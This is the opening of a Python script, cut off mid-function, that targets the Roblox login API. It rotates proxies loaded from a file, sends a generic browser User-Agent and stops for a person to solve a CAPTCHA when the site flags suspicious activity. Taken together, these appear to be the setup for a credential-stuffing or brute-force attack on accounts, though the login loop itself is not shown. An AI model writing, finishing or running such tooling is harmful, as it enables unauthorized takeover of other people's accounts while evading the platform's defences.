import os
import requests
import json
import time
import random

login_url = 'https://auth.roblox.com/v1/login'

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'
}

def handle_captcha():
    print("\n[!] CAPTCHA or suspicious activity detected.")
    os.system("termux-open-url https://www.roblox.com/login")
    input("Press Enter after solving CAPTCHA...\n")

def load_proxies(proxy_file='proxies.txt'):
    proxies = []
    try:
        with open(proxy_file, 'r', encoding='utf-8') as pf:
            for line in pf:
                p = line.strip()
                if p:
                    proxies.append(p)
    except FileNotFoundError:
        print("[!] Proxy file not found, proceeding without proxies.")
    return proxies

def get_proxy_dict(proxy_url):
    if proxy_url.startswith('socks5://') or proxy_url.startswith('socks4://'):
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    elif proxy_url.startswith('http://') or proxy_url.startswith('https://'):
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    else:
        # Assume HTTP if no schema
        proxy_url = 'http://' + proxy_url
